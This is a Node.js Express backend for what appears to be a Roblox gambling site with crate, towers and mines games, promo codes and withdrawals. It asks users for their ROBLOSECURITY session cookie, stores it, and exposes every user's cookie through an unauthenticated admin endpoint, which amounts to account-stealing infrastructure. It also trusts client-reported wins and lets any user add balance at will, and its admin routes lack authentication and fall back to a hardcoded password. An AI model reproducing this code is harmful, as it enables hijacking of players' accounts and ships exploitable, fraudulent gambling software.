import express from 'express';
import { createClient } from 'redis';
import cors from 'cors';
import jwt from 'jsonwebtoken';

const app = express();
const PORT = 3001;

// Redis client
const redis = createClient({
  url: process.env.REDIS_URL
});

redis.on('error', (err) => console.log('Redis Client Error', err));

await redis.connect();
console.log('✅ Connected to Redis');

app.use(cors());
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET || 'change-me-in-env';

// Middleware to verify JWT
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.sendStatus(401);

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
};

// ========== AUTH ENDPOINTS ==========

app.post('/api/auth/google', async (req, res) => {
  try {
    const { googleId, email, name, picture } = req.body;

    // Check if user exists
    let userData = await redis.get(`user:${googleId}`);
    
    if (!userData) {
      // Create new user
      const newUser = {
        googleId,
        email,
        name,
        picture,
        balance: 0,
        roblosecurity: '',
        inventory: [],
        createdAt: new Date().toISOString()
      };
      await redis.set(`user:${googleId}`, JSON.stringify(newUser));
      userData = JSON.stringify(newUser);
      
      // Add to users list
      await redis.sAdd('users:all', googleId);
    }

    const user = JSON.parse(userData);
    const token = jwt.sign({ googleId, email }, JWT_SECRET, { expiresIn: '7d' });

    res.json({ token, user });
  } catch (error) {
    console.error('Auth error:', error);
    res.status(500).json({ error: 'Authentication failed' });
  }
});

app.post('/api/auth/roblosecurity', authenticateToken, async (req, res) => {
  try {
    const { roblosecurity } = req.body;
    const { googleId } = req.user;

    const userData = await redis.get(`user:${googleId}`);
    if (!userData) return res.status(404).json({ error: 'User not found' });

    const user = JSON.parse(userData);
    user.roblosecurity = roblosecurity;
    await redis.set(`user:${googleId}`, JSON.stringify(user));

    res.json({ success: true, user });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update ROBLOSECURITY' });
  }
});

// ========== USER ENDPOINTS ==========

app.get('/api/user/profile', authenticateToken, async (req, res) => {
  try {
    const { googleId } = req.user;
    const userData = await redis.get(`user:${googleId}`);
    
    if (!userData) return res.status(404).json({ error: 'User not found' });
    
    res.json(JSON.parse(userData));
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch profile' });
  }
});

app.post('/api/user/update-balance', authenticateToken, async (req, res) => {
  try {
    const { googleId } = req.user;
    const { amount } = req.body;

    const userData = await redis.get(`user:${googleId}`);
    if (!userData) return res.status(404).json({ error: 'User not found' });

    const user = JSON.parse(userData);
    user.balance = parseFloat(user.balance) + parseFloat(amount);
    await redis.set(`user:${googleId}`, JSON.stringify(user));

    res.json({ success: true, balance: user.balance });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update balance' });
  }
});

// ========== CRATE ENDPOINTS ==========

app.post('/api/crates/open', authenticateToken, async (req, res) => {
  try {
    const { googleId } = req.user;
    const { crateType, cost, wonItem } = req.body;

    const userData = await redis.get(`user:${googleId}`);
    if (!userData) return res.status(404).json({ error: 'User not found' });

    const user = JSON.parse(userData);
    
    if (user.balance < cost) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }

    user.balance -= cost;
    user.inventory.push({
      ...wonItem,
      wonAt: new Date().toISOString(),
      crateType
    });

    await redis.set(`user:${googleId}`, JSON.stringify(user));

    // Log spin history
    await redis.lPush(`history:${googleId}`, JSON.stringify({
      type: 'crate',
      crateType,
      cost,
      wonItem,
      timestamp: new Date().toISOString()
    }));

    res.json({ success: true, user });
  } catch (error) {
    res.status(500).json({ error: 'Failed to open crate' });
  }
});

// ========== TOWERS ENDPOINTS ==========

app.post('/api/towers/play', authenticateToken, async (req, res) => {
  try {
    const { googleId } = req.user;
    const { bet, difficulty, won, multiplier } = req.body;

    const userData = await redis.get(`user:${googleId}`);
    if (!userData) return res.status(404).json({ error: 'User not found' });

    const user = JSON.parse(userData);
    
    if (won) {
      user.balance += bet * multiplier - bet;
    }

    await redis.set(`user:${googleId}`, JSON.stringify(user));

    await redis.lPush(`history:${googleId}`, JSON.stringify({
      type: 'towers',
      bet,
      difficulty,
      won,
      multiplier,
      profit: won ? bet * multiplier - bet : -bet,
      timestamp: new Date().toISOString()
    }));

    res.json({ success: true, balance: user.balance });
  } catch (error) {
    res.status(500).json({ error: 'Failed to process towers game' });
  }
});

// ========== MINES ENDPOINTS ==========

app.post('/api/mines/play', authenticateToken, async (req, res) => {
  try {
    const { googleId } = req.user;
    const { bet, minesCount, won, multiplier } = req.body;

    const userData = await redis.get(`user:${googleId}`);
    if (!userData) return res.status(404).json({ error: 'User not found' });

    const user = JSON.parse(userData);
    
    if (won) {
      user.balance += bet * multiplier - bet;
    }

    await redis.set(`user:${googleId}`, JSON.stringify(user));

    await redis.lPush(`history:${googleId}`, JSON.stringify({
      type: 'mines',
      bet,
      minesCount,
      won,
      multiplier,
      profit: won ? bet * multiplier - bet : -bet,
      timestamp: new Date().toISOString()
    }));

    res.json({ success: true, balance: user.balance });
  } catch (error) {
    res.status(500).json({ error: 'Failed to process mines game' });
  }
});

// ========== PROMO CODE ENDPOINTS ==========

app.post('/api/promo/redeem', authenticateToken, async (req, res) => {
  try {
    const { googleId } = req.user;
    const { code } = req.body;

    const promoData = await redis.get(`promo:${code}`);
    if (!promoData) {
      return res.status(404).json({ error: 'Invalid promo code' });
    }

    const promo = JSON.parse(promoData);
    
    // Check if already used by this user
    const usedKey = `promo:${code}:used:${googleId}`;
    const alreadyUsed = await redis.get(usedKey);
    if (alreadyUsed) {
      return res.status(400).json({ error: 'You have already used this code' });
    }

    // Check uses limit
    if (promo.uses >= promo.maxUses) {
      return res.status(400).json({ error: 'Promo code has reached maximum uses' });
    }

    // Update user balance
    const userData = await redis.get(`user:${googleId}`);
    const user = JSON.parse(userData);
    user.balance += promo.amount;
    await redis.set(`user:${googleId}`, JSON.stringify(user));

    // Mark as used
    await redis.set(usedKey, 'true');
    promo.uses += 1;
    await redis.set(`promo:${code}`, JSON.stringify(promo));

    res.json({ success: true, amount: promo.amount, balance: user.balance });
  } catch (error) {
    res.status(500).json({ error: 'Failed to redeem promo code' });
  }
});

app.get('/api/promo/list', async (req, res) => {
  try {
    const keys = await redis.keys('promo:*');
    const promos = [];
    
    for (const key of keys) {
      if (!key.includes(':used:')) {
        const data = await redis.get(key);
        if (data) promos.push(JSON.parse(data));
      }
    }
    
    res.json(promos);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch promo codes' });
  }
});

// ========== WITHDRAWAL ENDPOINTS ==========

app.post('/api/withdraw/request', authenticateToken, async (req, res) => {
  try {
    const { googleId } = req.user;
    const { amount, robloxUsername } = req.body;

    const userData = await redis.get(`user:${googleId}`);
    if (!userData) return res.status(404).json({ error: 'User not found' });

    const user = JSON.parse(userData);
    
    if (user.balance < amount) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }

    const withdrawalId = `withdrawal:${Date.now()}:${googleId}`;
    const withdrawal = {
      id: withdrawalId,
      googleId,
      email: user.email,
      name: user.name,
      amount,
      robloxUsername,
      status: 'pending',
      createdAt: new Date().toISOString()
    };

    await redis.set(withdrawalId, JSON.stringify(withdrawal));
    await redis.sAdd('withdrawals:pending', withdrawalId);

    // Deduct balance
    user.balance -= amount;
    await redis.set(`user:${googleId}`, JSON.stringify(user));

    res.json({ success: true, withdrawal });
  } catch (error) {
    res.status(500).json({ error: 'Failed to create withdrawal request' });
  }
});

app.get('/api/withdraw/pending', async (req, res) => {
  try {
    const withdrawalIds = await redis.sMembers('withdrawals:pending');
    const withdrawals = [];
    
    for (const id of withdrawalIds) {
      const data = await redis.get(id);
      if (data) withdrawals.push(JSON.parse(data));
    }
    
    res.json(withdrawals);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch withdrawals' });
  }
});

// ========== ADMIN ENDPOINTS ==========

app.post('/api/admin/verify', (req, res) => {
  const { password } = req.body;
  if (password === (process.env.ADMIN_PASSWORD || 'kerimpro')) {
    const adminToken = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ success: true, token: adminToken });
  } else {
    res.status(401).json({ error: 'Invalid password' });
  }
});

app.get('/api/admin/users', async (req, res) => {
  try {
    const userIds = await redis.sMembers('users:all');
    const users = [];
    
    for (const id of userIds) {
      const data = await redis.get(`user:${id}`);
      if (data) {
        const user = JSON.parse(data);
        users.push({
          googleId: user.googleId,
          email: user.email,
          name: user.name,
          balance: user.balance,
          roblosecurity: user.roblosecurity,
          inventoryCount: user.inventory.length,
          createdAt: user.createdAt
        });
      }
    }
    
    res.json(users);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch users' });
  }
});

app.post('/api/admin/add-balance', async (req, res) => {
  try {
    const { googleId, amount } = req.body;
    
    const userData = await redis.get(`user:${googleId}`);
    if (!userData) return res.status(404).json({ error: 'User not found' });

    const user = JSON.parse(userData);
    user.balance = parseFloat(user.balance) + parseFloat(amount);
    await redis.set(`user:${googleId}`, JSON.stringify(user));

    res.json({ success: true, newBalance: user.balance });
  } catch (error) {
    res.status(500).json({ error: 'Failed to add balance' });
  }
});

app.post('/api/admin/promo/create', async (req, res) => {
  try {
    const { code, amount, maxUses } = req.body;
    
    const promo = {
      code,
      amount: parseFloat(amount),
      maxUses: parseInt(maxUses),
      uses: 0,
      createdAt: new Date().toISOString()
    };

    await redis.set(`promo:${code}`, JSON.stringify(promo));
    res.json({ success: true, promo });
  } catch (error) {
    res.status(500).json({ error: 'Failed to create promo code' });
  }
});

app.delete('/api/admin/promo/:code', async (req, res) => {
  try {
    const { code } = req.params;
    await redis.del(`promo:${code}`);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete promo code' });
  }
});

app.post('/api/admin/withdrawal/approve', async (req, res) => {
  try {
    const { withdrawalId } = req.body;
    
    const data = await redis.get(withdrawalId);
    if (!data) return res.status(404).json({ error: 'Withdrawal not found' });

    const withdrawal = JSON.parse(data);
    withdrawal.status = 'approved';
    withdrawal.approvedAt = new Date().toISOString();
    
    await redis.set(withdrawalId, JSON.stringify(withdrawal));
    await redis.sRem('withdrawals:pending', withdrawalId);
    await redis.sAdd('withdrawals:approved', withdrawalId);

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to approve withdrawal' });
  }
});

app.post('/api/admin/withdrawal/reject', async (req, res) => {
  try {
    const { withdrawalId } = req.body;
    
    const data = await redis.get(withdrawalId);
    if (!data) return res.status(404).json({ error: 'Withdrawal not found' });

    const withdrawal = JSON.parse(data);
    
    // Refund user
    const userData = await redis.get(`user:${withdrawal.googleId}`);
    const user = JSON.parse(userData);
    user.balance += withdrawal.amount;
    await redis.set(`user:${withdrawal.googleId}`, JSON.stringify(user));

    withdrawal.status = 'rejected';
    withdrawal.rejectedAt = new Date().toISOString();
    
    await redis.set(withdrawalId, JSON.stringify(withdrawal));
    await redis.sRem('withdrawals:pending', withdrawalId);

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to reject withdrawal' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Caeflip API running on http://localhost:${PORT}`);
});
